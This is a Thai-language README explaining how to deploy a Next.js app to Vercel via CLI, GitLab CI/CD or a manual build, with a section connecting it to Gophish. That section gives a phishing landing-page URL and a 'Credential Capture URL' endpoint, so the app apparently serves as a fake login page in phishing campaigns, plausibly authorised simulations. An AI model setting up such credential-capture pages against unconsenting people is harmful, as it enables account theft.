# การตั้งค่า GitLab กับ Vercel

## วิธีที่ 1: ใช้ Vercel CLI (แนะนำ)

### 1. สร้าง Vercel Token
1. ไปที่ [vercel.com/account/tokens](https://vercel.com/account/tokens)
2. สร้าง token ใหม่
3. คัดลอก token

### 2. ตั้งค่า GitLab Variables
ไปที่ GitLab Project → Settings → CI/CD → Variables และเพิ่ม:

```
VERCEL_TOKEN=your_vercel_token_here
VERCEL_ORG_ID=your_org_id
VERCEL_PROJECT_ID=your_project_id
```

### 3. Deploy ครั้งแรก
```bash
# ใน local machine
vercel login
vercel --prod
```

### 4. ตั้งค่า Environment Variables
```bash
vercel env add NEXT_PUBLIC_GOPHISH_ENABLED
vercel env add GOPHISH_DOMAIN
vercel env add NEXT_PUBLIC_BASE_URL
```

## วิธีที่ 2: ใช้ GitLab CI/CD

### 1. ตั้งค่า GitLab Variables
เพิ่ม variables เหล่านี้ใน GitLab:

```
VERCEL_TOKEN=your_vercel_token_here
VERCEL_ORG_ID=your_org_id
VERCEL_PROJECT_ID=your_project_id
NEXT_PUBLIC_GOPHISH_ENABLED=true
GOPHISH_DOMAIN=https://your-gophish-domain.com
NEXT_PUBLIC_BASE_URL=https://your-vercel-app.vercel.app
```

### 2. ใช้ .gitlab-ci.yml ที่สร้างไว้
ไฟล์ `.gitlab-ci.yml` จะ:
- Build โปรเจค
- Deploy ไปยัง Vercel
- สร้าง preview สำหรับ develop branch

### 3. รัน Pipeline
- Push code ไปยัง GitLab
- ไปที่ CI/CD → Pipelines
- รัน deploy job

## วิธีที่ 3: Manual Deploy

### 1. Build โปรเจค
```bash
npm run build
```

### 2. Deploy ไปยัง Vercel
```bash
vercel --prod
```

### 3. ตั้งค่า Environment Variables
ใน Vercel Dashboard:
```
NEXT_PUBLIC_GOPHISH_ENABLED=true
GOPHISH_DOMAIN=https://your-gophish-domain.com
NEXT_PUBLIC_BASE_URL=https://your-vercel-app.vercel.app
```

## การตั้งค่าใน Gophish

หลังจากได้ Vercel URL แล้ว:

### Landing Page URL:
```
https://your-vercel-app.vercel.app/auth?rid={{.RId}}
```

### Credential Capture URL:
```
https://your-vercel-app.vercel.app/api/gophish
```

## การแก้ไขปัญหา

### 1. Vercel Token Error
- ตรวจสอบ VERCEL_TOKEN ใน GitLab variables
- สร้าง token ใหม่ถ้าจำเป็น

### 2. Build Error
- ตรวจสอบ Node.js version
- ตรวจสอบ dependencies

### 3. Environment Variables
- ตรวจสอบ variables ใน Vercel Dashboard
- ตรวจสอบ GitLab CI/CD variables

## การอัปเดต

### 1. อัปเดตโค้ด
```bash
git add .
git commit -m "Update code"
git push origin main
```

### 2. รัน Pipeline
- ไปที่ GitLab → CI/CD → Pipelines
- รัน deploy job

### 3. Manual Deploy (ถ้าจำเป็น)
```bash
vercel --prod
```

## ความปลอดภัย

### หมายเหตุสำคัญ:
- ⚠️ เก็บ Vercel token ไว้เป็นความลับ
- ⚠️ ใช้ GitLab protected variables
- ⚠️ ตรวจสอบ deployment logs
- ⚠️ ใช้ HTTPS เท่านั้น

### การป้องกัน:
- ✅ Protected branches
- ✅ Code review
- ✅ Environment variables protection
- ✅ Deployment logs monitoring 